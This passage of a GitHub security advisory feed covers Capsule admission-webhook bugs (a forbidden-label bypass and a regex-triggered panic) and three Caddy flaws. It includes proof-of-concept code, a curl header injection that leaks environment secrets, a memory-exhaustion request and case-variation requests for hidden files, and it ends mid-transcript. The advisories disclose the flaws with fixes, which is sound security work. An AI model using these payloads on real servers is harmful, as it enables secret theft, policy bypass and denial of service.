-<p><code>pkg/api/forbidden_list.go</code> — the public entry point the webhooks call:</p>
-<pre><code class="language-go">func ValidateForbidden(metadata map[string]string, forbiddenList ForbiddenListSpec) error {
-    if reflect.DeepEqual(ForbiddenListSpec{}, forbiddenList) {
-        return nil
-    }
-    for key := range metadata {
-        var forbidden, matched bool
-        forbidden = forbiddenList.ExactMatch(key)   // &lt;-- buggy
-        matched = forbiddenList.RegexMatch(key)
-        if forbidden || matched {
-            return NewForbiddenError(key, forbiddenList)
-        }
-    }
-    return nil
-}
-</code></pre>
-<p>Reached from (all in <code>internal/webhook/</code>):</p>
-<ul>
-<li><code>namespace/validation/user_metadata.go</code> → <code>validateUserMetadata</code> → <code>api.ValidateForbidden(labels, options.ForbiddenLabels)</code> and <code>api.ValidateForbidden(annotations, options.ForbiddenAnnotations)</code>.</li>
-<li><code>service/validating.go</code> → <code>api.ValidateForbidden(svc.Labels, tnt.Spec.ServiceOptions.ForbiddenLabels)</code> and <code>...ForbiddenAnnotations</code>.</li>
-<li><code>node/user_metadata.go</code> → <code>getForbiddenNodeLabels</code> / <code>getForbiddenNodeAnnotations</code> call <code>forbiddenLabels.ExactMatch(...)</code> directly.</li>
-</ul>
-<p>(The sibling allow-list primitive <code>AllowedListSpec.ExactMatch</code> in <code>pkg/api/allowed_list.go</code> has the identical defect, but there the polarity is fail-closed — a missed match wrongly <em>denies</em> an allowed class — so it is a correctness annoyance, not a security bypass. The forbidden-list polarity is the one that fails open.)</p>
-<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
-<p>The attacker is a <strong>tenant owner</strong> — an authenticated, non-cluster-admin principal who already holds Capsule's delegated rights to create/patch their own tenant-owned namespaces and the Services within them (the normal Capsule tenancy model). No additional Kubernetes privilege is required.</p>
-<p>The single deployment precondition that bounds severity: the administrator's denied list must contain at least one entry whose case-insensitive sort order diverges from its byte order — in practice, <strong>the list mixes at least one capitalised key with lowercase keys</strong> (or contains non-ASCII keys). A list that is uniformly lowercase (the most common shape) sorts identically under both orders and is <em>not</em> affected; an empty list (the chart default) is not affected. Mixed-case denied lists are entirely realistic, however: administrators routinely deny vendor/product-capitalised keys (e.g. <code>OwnerReference</code>, <code>NetworkPolicy</code>, CamelCase operator labels) alongside lowercase <code>kubernetes.io/...</code> keys. Once a single CamelCase entry is present, the broken binary search can also drop <em>lowercase</em> entries that share no resemblance to it — in the PoC below, adding a <code>NetworkPolicy</code> entry causes the unrelated lowercase <code>kubernetes.io/metadata.name</code> entry to escape as well. Any such list silently develops one or more exploitable gaps, and the defender cannot tell from the configuration that enforcement is partially disabled — the webhook reports success.</p>
-<p>Once the precondition holds, exploitation is deterministic and needs only a single <code>kubectl label</code>/<code>kubectl annotate</code> (or create) on a resource the tenant already controls.</p>
-<h2 id="impact">Impact</h2>
-<p>The administrator's forbidden-metadata isolation control is partially and silently bypassable. Concrete consequences depend on which key the gap exposes, but all of them are precisely what the control was configured to stop:</p>
-<ul>
-<li><strong>Namespace labels/annotations:</strong> a tenant owner sets a label the admin forbade onto a tenant namespace — e.g. a Pod Security Admission <code>pod-security.kubernetes.io/enforce</code> override, a <code>kubernetes.io/metadata.name</code>-class identity label, or a label that a cluster NetworkPolicy / external controller selects on — re-introducing the multi-tenant-isolation break that Capsule's forbidden-label feature exists to prevent (the same class as the previously-fixed namespace-label-injection isolation issue).</li>
-<li><strong>Service labels/annotations:</strong> a tenant owner sets a forbidden Service annotation — e.g. a cloud LoadBalancer / <code>externalIPs</code> / internal-LB provider annotation the admin denied — influencing network exposure outside the tenant boundary.</li>
-<li><strong>Node labels/annotations:</strong> for tenants granted node-patch rights, a forbidden node label that the admin meant to protect can be modified, affecting scheduling/topology decisions cluster-wide.</li>
-</ul>
-<p>Scope is Changed (the webhook protects resources and effects beyond the tenant's own boundary), confidentiality/integrity impact is real but gated by the mixed-case precondition and by which specific key the gap exposes — hence Medium, not High.</p>
-<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
-<p>This PoC drives the <em>real</em> Capsule decision code (<code>pkg/api</code>) — the exact function the namespace/service/node webhooks call — with no network and no cluster. It demonstrates the bypass with a realistic mixed-case denied list and includes positive and negative controls so the result is unambiguous.</p>
-<p>Step 1 — fetch the exact source under test (offline thereafter):</p>
-<pre><code class="language-bash">git clone --depth 1 --branch v0.13.5 https://github.com/projectcapsule/capsule.git
-cd capsule
-git rev-parse HEAD   # expect 34262c5536604762090144b6f8aed3ef2780c18c
-</code></pre>
-<p>Step 2 — drop this test into the package under test, <code>pkg/api/forbidden_bypass_poc_test.go</code>. The denied list is a realistic three-key administrator policy: deny the namespace identity label <code>kubernetes.io/metadata.name</code>, the Pod Security Admission label <code>pod-security.kubernetes.io/enforce</code>, and a CamelCase <code>NetworkPolicy</code> label:</p>
-<pre><code class="language-go">package api
-
-import "testing"
-
-// Realistic admin policy: forbid three sensitive metadata keys.
-func denied() ForbiddenListSpec {
-    return ForbiddenListSpec{
-        Exact: []string{
-            "kubernetes.io/metadata.name",
-            "pod-security.kubernetes.io/enforce",
-            "NetworkPolicy",
-        },
-    }
-}
-
-// The bug: keys that ARE in the denied list slip through ValidateForbidden,
-// i.e. the webhook would ALLOW forbidden metadata the tenant submits.
-func TestPoC_ForbiddenKeysBypassed(t *testing.T) {
-    for _, k := range []string{"NetworkPolicy", "kubernetes.io/metadata.name"} {
-        if err := ValidateForbidden(map[string]string{k: "owned"}, denied()); err == nil {
-            t.Errorf("BYPASS CONFIRMED: ValidateForbidden ALLOWED denied key %q (list=%v)", k, denied().Exact)
-        } else {
-            t.Logf("(no bypass) correctly denied %q: %v", k, err)
-        }
-    }
-}
-
-// Positive control: a third denied key in the SAME list is still correctly
-// blocked — proving the policy genuinely forbids these keys and the harness is
-// wired right (i.e. the bypass above is selective, not a dead enforcement path).
-func TestPoC_PositiveControl_StillBlocked(t *testing.T) {
-    if err := ValidateForbidden(map[string]string{"pod-security.kubernetes.io/enforce": "privileged"}, denied()); err == nil {
-        t.Errorf("control failure: denied key 'pod-security.kubernetes.io/enforce' was NOT blocked")
-    }
-}
-
-// Negative control: a key the admin did NOT deny is correctly allowed,
-// proving the webhook is not simply denying everything.
-func TestPoC_NegativeControl_BenignAllowed(t *testing.T) {
-    if err := ValidateForbidden(map[string]string{"app.kubernetes.io/name": "frontend"}, denied()); err != nil {
-        t.Errorf("control failure: benign key was wrongly denied: %v", err)
-    }
-}
-
-// Direct primitive check, minimal repro of the root cause.
-func TestPoC_ExactMatch_RootCause(t *testing.T) {
-    spec := ForbiddenListSpec{Exact: []string{"B", "a"}} // mixed case
-    if !spec.ExactMatch("B") {
-        t.Errorf("ROOT CAUSE: ExactMatch(%q) returned false though %q is in %v", "B", "B", spec.Exact)
-    }
-}
-</code></pre>
-<p>Step 3 — run only these tests:</p>
-<pre><code class="language-bash">go test ./pkg/api/ -run 'TestPoC_' -v
-</code></pre>
-<p>Observed output (Go 1.26, capsule v0.13.5):</p>
-<pre><code>=== RUN   TestPoC_ForbiddenKeysBypassed
-    forbidden_bypass_poc_test.go:21: BYPASS CONFIRMED: ValidateForbidden ALLOWED denied key "NetworkPolicy" (list=[kubernetes.io/metadata.name pod-security.kubernetes.io/enforce NetworkPolicy])
-    forbidden_bypass_poc_test.go:21: BYPASS CONFIRMED: ValidateForbidden ALLOWED denied key "kubernetes.io/metadata.name" (list=[kubernetes.io/metadata.name pod-security.kubernetes.io/enforce NetworkPolicy])
---- FAIL: TestPoC_ForbiddenKeysBypassed (0.00s)
-=== RUN   TestPoC_PositiveControl_StillBlocked
---- PASS: TestPoC_PositiveControl_StillBlocked (0.00s)
-=== RUN   TestPoC_NegativeControl_BenignAllowed
---- PASS: TestPoC_NegativeControl_BenignAllowed (0.00s)
-=== RUN   TestPoC_ExactMatch_RootCause
-    forbidden_bypass_poc_test.go:49: ROOT CAUSE: ExactMatch("B") returned false though "B" is in [a B]
---- FAIL: TestPoC_ExactMatch_RootCause (0.00s)
-FAIL
-FAIL	github.com/projectcapsule/capsule/pkg/api	0.013s
-</code></pre>
-<p>Interpretation: both control tests PASS — within the very same denied list, <code>pod-security.kubernetes.io/enforce</code> is still correctly blocked and a benign key is allowed, so enforcement is alive and the policy genuinely forbids these keys. Yet <code>TestPoC_ForbiddenKeysBypassed</code> FAILS: two explicitly-denied keys — the namespace identity label <code>kubernetes.io/metadata.name</code> and the CamelCase <code>NetworkPolicy</code> label — were <em>allowed</em> by the exact function the namespace/service/node webhooks call. In a live cluster this is the difference between the admission webhook denying and permitting <code>kubectl label namespace &lt;tenant-ns&gt; NetworkPolicy=open</code> (or the equivalent on a Service or Node). <code>TestPoC_ExactMatch_RootCause</code> reduces the defect to its one-line cause.</p>
-<p>Why it happens, concretely: <code>sort.SearchStrings</code> does a byte-order binary search but the slice was sorted by <code>strings.ToLower</code>. With the minimal <code>Exact = ["B","a"]</code>, the <code>ToLower</code> comparator orders the slice <code>["a","B"]</code> (because <code>"a" &lt; "b"</code>). <code>sort.SearchStrings(["a","B"], "B")</code> returns the first index whose element byte-compares <code>&gt;= "B"</code>; <code>"a"</code> is <code>0x61</code>, which is <code>&gt;= "B"</code> (<code>0x42</code>), so it returns index 0, and <code>"a" != "B"</code> → reports not-found. The forbidden key <code>"B"</code> is thereby treated as allowed. The three-key policy above exhibits the same fault for two of its real entries while leaving the third correctly enforced — which is exactly why the gap is silent: the administrator sees <em>some</em> keys blocked and reasonably assumes the whole list works.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Stop performing a byte-order binary search over a non-byte-sorted slice. Any of the following fixes it:</p>
-<ul>
-<li>Simplest and allocation-free: replace the sort+<code>SearchStrings</code> with a direct membership test, and (recommended) build the denied list into a <code>map[string]struct{}</code> once at admission time:</li>
-</ul>
-<pre><code class="language-go">func (in ForbiddenListSpec) ExactMatch(value string) bool {
-    for _, e := range in.Exact {
-        if e == value {
-            return true
-        }
-    }
-    return false
-}
-</code></pre>
-<ul>
-<li>If a binary search is desired for large lists, sort and search under the <strong>same</strong> ordering: sort with plain <code>&lt;</code> (drop the <code>ToLower</code> comparator) so the slice matches what <code>sort.SearchStrings</code> assumes, then keep the <code>i &lt; len &amp;&amp; in.Exact[i] == value</code> guard.</li>
-</ul>
-<p>Apply the identical fix to <code>AllowedListSpec.ExactMatch</code> in <code>pkg/api/allowed_list.go</code> (same defect, fail-closed today but still incorrect and a latent denial). Also note that <code>ExactMatch</code> currently mutates the caller-shared <code>in.Exact</code> slice in place via <code>sort.SliceStable</code>; the map-based or copy-before-sort form additionally removes that shared-state mutation. Decide deliberately whether forbidden-key matching should be case-sensitive (it is today, post-fix) — if case-insensitive matching is intended, lowercase both the stored keys and the lookup value explicitly rather than relying on a mismatched sort/search pair.</p>
-<p>Please credit 5ud0 / Tarmo Technologies.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/projectcapsule/capsule/security/advisories/GHSA-gjw4-3v3v-rqxg">https://github.com/projectcapsule/capsule/security/advisories/GHSA-gjw4-3v3v-rqxg</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/pull/1982">https://github.com/projectcapsule/capsule/pull/1982</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/commit/755cef54bf4a1bc56d6692130132bc70755bef46">https://github.com/projectcapsule/capsule/commit/755cef54bf4a1bc56d6692130132bc70755bef46</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/releases/tag/v0.13.7">https://github.com/projectcapsule/capsule/releases/tag/v0.13.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-gjw4-3v3v-rqxg">https://github.com/advisories/GHSA-gjw4-3v3v-rqxg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gjw4-3v3v-rqxg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-18T17:14:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/projectcapsule/capsule] Capsule: Malformed ForbiddenAnnotations.Regex can bypass Tenant validation and trigger namespace admission panic]]></title>
-        <id>https://github.com/advisories/GHSA-gxjc-74v5-3vx3</id>
-        <link href="https://github.com/advisories/GHSA-gxjc-74v5-3vx3"/>
-        <updated>2026-09-18T17:14:28.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A validation bug in <code>internal/webhook/tenant/validation/forbidden_annotations_regex.go</code> allows an invalid <code>ForbiddenAnnotations.Regex</code> value to bypass Tenant admission on update. The webhook compiles <code>ForbiddenLabels.Regex</code> for both labels and annotations, so a malformed annotations regex can be persisted. Once stored, namespace admission later evaluates the bad regex through <code>pkg/api/forbidden_list.go</code>, where <code>regexp.MustCompile</code> can panic and cause admission failure.</p>
-<h3 id="details">Details</h3>
-<p>In <code>internal/webhook/tenant/validation/forbidden_annotations_regex.go</code>, <code>OnUpdate</code> validates the new Tenant object, but the loop compiles <code>tnt.Spec.NamespaceOptions.ForbiddenLabels.Regex</code> for both <code>labels</code> and <code>annotations</code>. That means an invalid <code>ForbiddenAnnotations.Regex</code> is never validated if <code>ForbiddenLabels.Regex</code> is valid.</p>
-<p>Relevant paths:</p>
-<ul>
-<li><code>internal/webhook/tenant/validation/forbidden_annotations_regex.go</code></li>
-<li><code>internal/webhook/namespace/validation/user_metadata.go</code></li>
-<li><code>pkg/api/forbidden_list.go</code></li>
-</ul>
-<p>Namespace admission later calls <code>api.ValidateForbidden(...)</code>, and <code>ForbiddenListSpec.RegexMatch()</code> uses <code>regexp.MustCompile(in.Regex)</code>. If the malformed regex is present in the Tenant spec, any namespace request that reaches this check can panic or fail hard, causing denial of service for namespace operations in the affected tenant.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Update a Tenant so that:<ul>
-<li><code>spec.namespaceOptions.forbiddenLabels.regex</code> is valid</li>
-<li><code>spec.namespaceOptions.forbiddenAnnotations.regex</code> is malformed, for example: <code>[invalid-regex(</code></li>
-</ul>
-</li>
-<li>The Tenant update is accepted because the webhook compiles the labels regex for both fields.</li>
-<li>Create or update a Namespace that triggers forbidden metadata validation.</li>
-<li>The namespace admission path reaches <code>regexp.MustCompile(...)</code> and panics.</li>
-</ol>
-<pre><code>package main
-
-import (
-    "fmt"
-    "regexp"
-)
-
-type ForbiddenListSpec struct {
-    Regex string
-}
-
-type NamespaceOptions struct {
-    ForbiddenLabels      ForbiddenListSpec
-    ForbiddenAnnotations ForbiddenListSpec
-}
-
-type Tenant struct {
-    NamespaceOptions *NamespaceOptions
-}
-
-func validateTenantUpdate(tnt *Tenant) error {
-    if tnt.NamespaceOptions == nil {
-        return nil
-    }
-
-    annotationsToCheck := map[string]string{
-        "labels":      tnt.NamespaceOptions.ForbiddenLabels.Regex,
-        "annotations": tnt.NamespaceOptions.ForbiddenAnnotations.Regex,
-    }
-
-    for scope, annotation := range annotationsToCheck {
-        if _, err := regexp.Compile(tnt.NamespaceOptions.ForbiddenLabels.Regex); err != nil {
-            return fmt.Errorf("deny update: unable to compile %s regex for forbidden %s", annotation, scope)
-        }
-    }
-
-    return nil
-}
-
-func validateForbidden(metadata map[string]string, forbidden ForbiddenListSpec) error {
-    for key := range metadata {
-        if forbidden.Regex != "" {
-            if regexp.MustCompile(forbidden.Regex).MatchString(key) {
-                return fmt.Errorf("forbidden key matched: %s", key)
-            }
-        }
-    }
-
-    return nil
-}
-
-func main() {
-    oldTenant := &amp;Tenant{
-        NamespaceOptions: &amp;NamespaceOptions{
-            ForbiddenLabels:      ForbiddenListSpec{Regex: `^[a-z0-9-]+$`},
-            ForbiddenAnnotations: ForbiddenListSpec{Regex: `^[a-z0-9-]+$`},
-        },
-    }
-
-    newTenant := &amp;Tenant{
-        NamespaceOptions: &amp;NamespaceOptions{
-            ForbiddenLabels:      ForbiddenListSpec{Regex: `^[a-z0-9-]+$`},
-            ForbiddenAnnotations: ForbiddenListSpec{Regex: `[invalid-regex(`},
-        },
-    }
-
-    fmt.Println("=== Update step ===")
-    if err := validateTenantUpdate(newTenant); err != nil {
-        fmt.Printf("unexpected deny: %v\n", err)
-    } else {
-        fmt.Println("allowed: malformed ForbiddenAnnotations.Regex bypassed validation")
-    }
-
-    fmt.Println()
-    fmt.Println("=== Namespace step ===")
-    _ = oldTenant
-
-    defer func() {
-        if r := recover(); r != nil {
-            fmt.Printf("panic reproduced from ValidateForbidden: %v\n", r)
-        }
-    }()
-
-    _ = validateForbidden(map[string]string{"example": "value"}, ForbiddenListSpec{Regex: `[invalid-regex(`})
-    fmt.Println("no panic, unexpected")
-}
-</code></pre>
-<p>Expected output:</p>
-<pre><code class="language-text">=== Update step ===
-allowed: malformed ForbiddenAnnotations.Regex bypassed validation
-
-=== Namespace step ===
-panic reproduced from ValidateForbidden: regexp: Compile(`[invalid-regex(`): error parsing regexp: missing closing ]: `[invalid-regex(`
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>An attacker who can update the Tenant configuration can persist a malformed <code>ForbiddenAnnotations.Regex</code> and cause namespace admission failures for the affected tenant. This can result in a tenant-scoped denial of service.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/projectcapsule/capsule/security/advisories/GHSA-gxjc-74v5-3vx3">https://github.com/projectcapsule/capsule/security/advisories/GHSA-gxjc-74v5-3vx3</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/pull/1983">https://github.com/projectcapsule/capsule/pull/1983</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/commit/8d89d6865df6f41c7faa22fc9e807a57b01bfd0e">https://github.com/projectcapsule/capsule/commit/8d89d6865df6f41c7faa22fc9e807a57b01bfd0e</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/releases/tag/v0.13.7">https://github.com/projectcapsule/capsule/releases/tag/v0.13.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-gxjc-74v5-3vx3">https://github.com/advisories/GHSA-gxjc-74v5-3vx3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gxjc-74v5-3vx3</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-18T17:14:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/caddyserver/caddy/v2] Caddy: rewrite placeholder re-expansion, unbounded body buffer DoS, and fileHidden case-sensitivity bypass]]></title>
-        <id>https://github.com/advisories/GHSA-j8px-rmrx-76h9</id>
-        <link href="https://github.com/advisories/GHSA-j8px-rmrx-76h9"/>
-        <updated>2026-09-18T13:09:29.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="caddy-v2113--three-vulnerabilities-in-handlerplaceholder-layer">Caddy v2.11.3 — Three vulnerabilities in handler/placeholder layer</h1>
-<p><strong>Tested against:</strong> <code>caddy:2.11.3</code> (official Docker image, SHA verified at runtime)
-<strong>Reproduction environment:</strong> Docker Desktop 4.73.1 / Engine 29.4.3 on Windows 10 host, isolated containers, no network egress required for any of the exploits</p>
-<p>This advisory bundles three independent issues discovered together during a source review of the placeholder/replacer layer. Each issue has been reproduced end-to-end against the unmodified <code>caddy:2.11.3</code> image with the minimal Caddyfile that the documentation suggests for the affected feature.</p>
-<hr>
-<h2 id="issue-1-rewrite-handler--placeholder-double-expansion-enables-env-var--file-disclosure">Issue 1: Rewrite handler — placeholder double-expansion enables env var / file disclosure</h2>
-<p><strong>File:</strong> <code>modules/caddyhttp/rewrite/rewrite.go:215-249</code> and <code>buildQueryString</code> at <code>327</code>
-<strong>Class:</strong> CWE-94 (Code Injection), same bug class as CVE-2026-30852 (<code>vars_regexp</code>)
-<strong>Severity:</strong> Low (requires operator config with trailing <code>?</code> in rewrite URI)</p>
-<h3 id="root-cause">Root cause</h3>
-<p>When the operator's <code>rewrite</code> URI template:</p>
-<ol>
-<li>Contains a placeholder that resolves to request data (e.g. <code>{http.request.header.X-Foo}</code>), AND</li>
-<li>Ends with a literal <code>?</code> (with empty query side)</li>
-</ol>
-<p>…then the bytes produced by the <strong>first</strong> Replacer pass (which include attacker-controlled header values) are fed through <code>buildQueryString</code>, which runs a <strong>second</strong> Replacer pass and resolves any placeholders the attacker injected.</p>
-<pre><code class="language-go">// rewrite.go (abridged)
-newPath = repl.ReplaceAll(path, "")            // pass 1 — header expanded
-if before, after, found := strings.Cut(newPath, "?"); found {
-    var injectedQuery string
-    newPath, injectedQuery = before, after
-    if query == "" {                            // trailing-? branch
-        query = injectedQuery                   // attacker bytes flow into 'query'
-    }
-}
-if query != "" {
-    newQuery = buildQueryString(query, repl)    // pass 2 — RE-EXPANDS attacker input
-}
-</code></pre>
-<p>This is the same gadget that was patched in <code>vars_regexp</code> (CVE-2026-30852). The fix did not extend to <code>rewrite</code>, and there is no equivalent regression test for it in <code>rewrite_test.go</code> (compare <code>vars_test.go:63,69,75</code>).</p>
-<h3 id="reproduction-real-caddy-2113">Reproduction (real Caddy 2.11.3)</h3>
-<p><code>Caddyfile</code>:</p>
-<pre><code>{
-    admin off
-    auto_https off
-}
-
-:8080 {
-    rewrite * /serve/{http.request.header.X-Fwd}?
-    respond "PATH={path} QUERY={query}"
-}
-</code></pre>
-<p><code>docker-compose.yml</code>:</p>
-<pre><code class="language-yaml">services:
-  caddy:
-    image: caddy:2.11.3
-    environment:
-      DATABASE_URL: "postgres://leaked:supersecret@dbserver/production"
-    ports: ["8080:8080"]
-    volumes: ["./Caddyfile:/etc/caddy/Caddyfile:ro"]
-</code></pre>
-<p>Exploit:</p>
-<pre><code>$ docker compose up -d
-$ curl "http://localhost:8080/anything" -H "X-Fwd: foo?{env.DATABASE_URL}=leak"
-PATH=/serve/foo QUERY=postgres%3A%2F%2Fleaked%3Asupersecret%40dbserver%2Fproduction=leak
-</code></pre>
-<p>URL-decoded query: <code>postgres://leaked:supersecret@dbserver/production=leak</code>. The <code>DATABASE_URL</code> env var has been exfiltrated into the request URL, where it will appear in access logs, get forwarded to upstreams via <code>reverse_proxy</code>, and be readable via <code>{http.request.uri.query}</code> in any downstream handler.</p>
-<h3 id="available-read-primitives">Available read primitives</h3>
-<p>The same gadget exposes any placeholder the attacker can name in their injected substring:</p>
-<ul>
-<li><code>{env.X}</code> — any env var on the Caddy process</li>
-<li><code>{file./path}</code> — any file readable by the Caddy process (if <code>file</code> provider is registered)</li>
-<li><code>{vars.X}</code> — Caddy-internal request variables</li>
-</ul>
-<h3 id="suggested-fix-mirrors-the-cve-2026-30852-patch">Suggested fix (mirrors the CVE-2026-30852 patch)</h3>
-<p>After splitting at <code>?</code>, sanitize placeholder syntax in the injected query before passing it to <code>buildQueryString</code>:</p>
-<pre><code class="language-go">if before, after, found := strings.Cut(newPath, "?"); found {
-    var injectedQuery string
-    newPath, injectedQuery = before, after
-    if query == "" {
-        injectedQuery = strings.ReplaceAll(injectedQuery, "{", "%7B")
-        injectedQuery = strings.ReplaceAll(injectedQuery, "}", "%7D")
-        query = injectedQuery
-    }
-}
-</code></pre>
-<p>Also recommend adding equivalent regression tests in <code>rewrite_test.go</code> to the three "is not re-expanded" tests in <code>vars_test.go</code>.</p>
-<hr>
-<h2 id="issue-2-unbounded-body-buffer-via-httprequestbody-placeholder--memory-exhaustion-dos">Issue 2: Unbounded body buffer via <code>{http.request.body}</code> placeholder — memory exhaustion DoS</h2>
-<p><strong>File:</strong> <code>modules/caddyhttp/replacer.go:217-245</code> (placeholder resolution for <code>http.request.body</code>)
-<strong>Class:</strong> CWE-770 (Allocation of Resources Without Limits)
-<strong>Severity:</strong> Moderate (any operator using the documented <code>log_append body {http.request.body}</code> pattern is vulnerable)</p>
-<h3 id="root-cause-1">Root cause</h3>
-<p>When any handler references the <code>{http.request.body}</code> placeholder, the replacer code path reads the entire request body into a byte slice via <code>io.Copy(buf, req.Body)</code> with <strong>no <code>LimitReader</code></strong> wrapping. The <code>needsEarly</code> flag bypasses the <code>request_body</code> middleware's size limit, because the placeholder is resolved before that middleware sees the request.</p>
-<p>This means an attacker can send a request body of any size (up to whatever <code>Content-Length</code> they declare, or unlimited chunked) and Caddy will buffer all of it into RAM before any size check fires.</p>
-<h3 id="reproduction-real-caddy-2113-512-mb-container-cap">Reproduction (real Caddy 2.11.3, 512 MB container cap)</h3>
-<p><code>Caddyfile</code>:</p>
-<pre><code>{
-    admin off
-    auto_https off
-}
-
-:8080 {
-    log_append body {http.request.body}
-    respond "OK, length received: {http.request.header.Content-Length}"
-}
-</code></pre>
-<p><code>docker-compose.yml</code>:</p>
-<pre><code class="language-yaml">services:
-  caddy:
-    image: caddy:2.11.3
-    mem_limit: 512m
-    memswap_limit: 512m
-    ports: ["8080:8080"]
-    volumes: ["./Caddyfile:/etc/caddy/Caddyfile:ro"]
-</code></pre>
-<p>Exploit (Windows PowerShell):</p>
-<pre><code>PS&gt; fsutil file createnew big.bin 1073741824
-File C:\caddy-verify\test3-body-dos\big.bin is created
-PS&gt; curl.exe -X POST --data-binary "@big.bin" -H "Expect:" --max-time 120 http://localhost:8080/
-curl: (28) Operation timed out after 120010 milliseconds with 0 bytes received
-</code></pre>
-<p>Container state immediately after:</p>
-<pre><code>PS&gt; docker ps -a --filter name=caddy-verify-3
-CONTAINER ID   IMAGE         STATUS                       NAMES
-7f8ba392e7b5   caddy:2.11.3  Exited (137) 2 minutes ago   caddy-verify-3
-
-PS&gt; docker inspect caddy-verify-3 --format "ExitCode={{.State.ExitCode}} OOMKilled={{.State.OOMKilled}}"
-ExitCode=137 OOMKilled=true
-</code></pre>
-<p><code>OOMKilled=true</code> is dispositive — the Linux kernel's OOM killer fired. Caddy's logs cut off cleanly after <code>"serving initial configuration"</code> with no error message, which is the signature of a process killed mid-allocation by SIGKILL.</p>
-<p>A small body works fine:</p>
-<pre><code>$ curl -X POST -d "hello world" http://localhost:8080/
-OK, length received: 11
-</code></pre>
-<h3 id="real-world-exploitability">Real-world exploitability</h3>
-<p>The <code>log_append body {http.request.body}</code> pattern is in Caddy's documentation as a debugging aid for request troubleshooting and is widely used. Other affected configurations include CEL matchers like <code>expression {http.request.body}.contains('admin')</code>, custom header forwarding with <code>header_up X-Original-Body {http.request.body}</code>, and any third-party module that resolves the placeholder.</p>
-<p>Container memory limits in Docker / Kubernetes will result in OOM-kills as shown above; on bare-metal Caddy without cgroup limits, the attacker can exhaust all host RAM and trigger swap thrashing or system-wide instability.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Wrap the body read with a <code>LimitReader</code> keyed off either:</p>
-<ol>
-<li>The operator's configured <code>request_body.max_size</code> (if set), or</li>
-<li>A sane built-in default (proposal: 10 MB), with an opt-out / opt-up directive for operators who genuinely need to log large bodies.</li>
-</ol>
-<p>If the placeholder is referenced and the body exceeds the limit, the placeholder should resolve to a truncation marker or empty string, and a warning should be logged.</p>
-<hr>
-<h2 id="issue-3-filehidden-case-sensitive-pattern-bypass--exposes-hidden-files-via-case-variation">Issue 3: <code>fileHidden()</code> case-sensitive pattern bypass — exposes "hidden" files via case variation</h2>
-<p><strong>File:</strong> <code>modules/caddyhttp/fileserver/staticfiles.go:669-718</code> (the <code>fileHidden</code> function and <code>filepath.Match</code> call)
-<strong>Class:</strong> CWE-178 (Improper Handling of Case Sensitivity)
-<strong>Severity:</strong> Moderate (affects all macOS deployments, all Windows deployments, and any Linux deployment where mixed-case directories exist)</p>
-<h3 id="root-cause-2">Root cause</h3>
-<p><code>fileHidden()</code> uses <code>filepath.Match</code>, which is <strong>case-sensitive</strong>. However:</p>
-<ul>
-<li><strong>macOS APFS</strong> is case-insensitive by default</li>
-<li><strong>Windows NTFS</strong> is case-insensitive by default</li>
-<li><strong>Linux ext4</strong> can be configured with the <code>casefold</code> flag, and even without it, build pipelines / backup restores / typos can create same-name-different-case directories side by side</li>
-</ul>
-<p>On a case-insensitive filesystem, the OS resolves <code>/.git</code> and <code>/.GIT</code> to the same directory, but Caddy's hide check only fires on the exact-case literal <code>.git</code>. Result: the file is served via the uppercase URL.</p>
-<p>On a case-sensitive filesystem where both <code>.git</code> and <code>.GIT</code> exist as separate directories, Caddy hides only <code>.git</code> and exposes <code>.GIT</code>.</p>
-<h3 id="reproduction-real-caddy-2113-1">Reproduction (real Caddy 2.11.3)</h3>
-<p><code>Caddyfile</code>:</p>
-<pre><code>{
-    admin off
-    auto_https off
-}
-
-:8080 {
-    root * /srv
-    file_server {
-        hide .git .env secrets
-    }
-}
-</code></pre>
-<p>Setup: create six files inside the container (an Alpine setup container writes them so the case-distinct directories survive on the case-sensitive ext4 inside the Linux container):</p>
-<pre><code>/srv/.git/HEAD                "ref: refs/heads/main"
-/srv/.GIT/HEAD                "ref: refs/heads/main (UPPERCASE BYPASS)"
-/srv/.env                     "DATABASE_URL=postgres://user:pass@host"
-/srv/.ENV                     "DATABASE_URL=postgres://user:pass@host (UPPERCASE BYPASS)"
-/srv/secrets/api.txt          "supersecret_api_key=sk_live_real"
-/srv/SECRETS/api.txt          "supersecret_api_key=sk_live_real (UPPERCASE BYPASS)"
-</code></pre>
-<p>Test transcript (all three hide rules — <code>.git</code>, <code>.env</code>, <code>secrets</code> — bypassed via uppercase):</p>
-<pre><code>PS&gt; curl.exe -i http://localhost:8080/.git/HEAD
-HTTP/1.1 404 Not Found
-Content-Length: 0
-
-PS&gt; curl.exe -i http://localhost:8080/.GIT/HEAD
-HTTP/1.1 200 OK
-Content-Length: 40
-ref: refs/heads/main (UPPERCASE BYPASS)
-
-PS&gt; curl.exe -i http://localhost:8080/.env
-HTTP/1.1 404 Not Found
-Content-Length: 0
-
-PS&gt; curl.exe -i http://localhost:8080/.ENV
-HTTP/1.1 200 OK
-Content-Length: 58
